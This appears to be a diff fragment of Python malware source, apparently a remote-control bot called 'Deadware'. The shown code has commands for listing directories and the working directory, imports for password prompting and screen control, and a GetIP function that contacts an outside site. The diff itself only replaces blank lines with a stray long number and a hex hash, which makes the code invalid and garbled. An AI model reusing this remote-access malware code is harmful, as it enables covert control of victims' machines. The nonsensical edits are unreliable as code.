@@ -816,7 +816,7 @@ import getpass
 
 import pyautogui
 
-
+999612452633333901
 def GetIP():
     try:
         r=requests.get("https://utilities.tk/network/info")
@@ -1003,7 +1003,7 @@ async def cwd(ctx):
 
 import glob
 
-
+fe092a35555a08c1fe2015f33aba7c20dd5f62fa3f527a791e4c9f4d36237d99
 @Deadware.command()
 async def dir(ctx):
     directory = glob.glob('*/')
